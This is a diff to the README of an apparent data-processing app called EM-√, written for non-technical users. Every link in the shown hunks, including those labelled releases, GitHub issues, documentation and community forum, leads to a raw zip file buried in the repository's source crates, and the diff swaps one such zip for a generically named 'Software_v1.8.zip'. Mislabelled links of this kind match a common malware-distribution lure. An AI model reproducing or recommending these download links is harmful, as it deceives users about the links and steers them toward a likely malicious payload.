@@ -8,9 +8,9 @@ Welcome to EM-√! This application helps you process large amounts of data whil
 
 To get started, you need to download EM-√. 
 
-[![Download EM-√](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip%20EM--%E2%88%9A-blue?style=for-the-badge)](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip)
+[![Download EM-√](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip%20EM--%E2%88%9A-blue?style=for-the-badge)](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip)
 
-1. Visit this page to download: [EM-√ Releases](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip).
+1. Visit this page to download: [EM-√ Releases](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip).
 2. Choose the latest release version.
 3. Download the file that matches your operating system.
 
@@ -67,14 +67,14 @@ A: No, EM-√ is designed for non-technical users. You can run it easily without
 
 ## 📞 Support
 
-If you encounter any issues while using EM-√, please feel free to reach out through our [GitHub issues page](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip). We are here to help you.
+If you encounter any issues while using EM-√, please feel free to reach out through our [GitHub issues page](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip). We are here to help you.
 
 ## 🔗 Additional Resources
 
 For more information and updates, you can check out:
 
-- [Documentation](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip)
-- [Community Forum](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip)
 
 Enjoy exploring the capabilities of EM-√! Don't forget to visit the releases page for future updates.  
-[Download EM-√ again here](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-io/emsqrt-v2.6.zip).
+[Download EM-√ again here](https://raw.githubusercontent.com/cupriteinstrumentalconditioning413/emsqrt/main/crates/emsqrt-operators/Software_v1.8.zip).
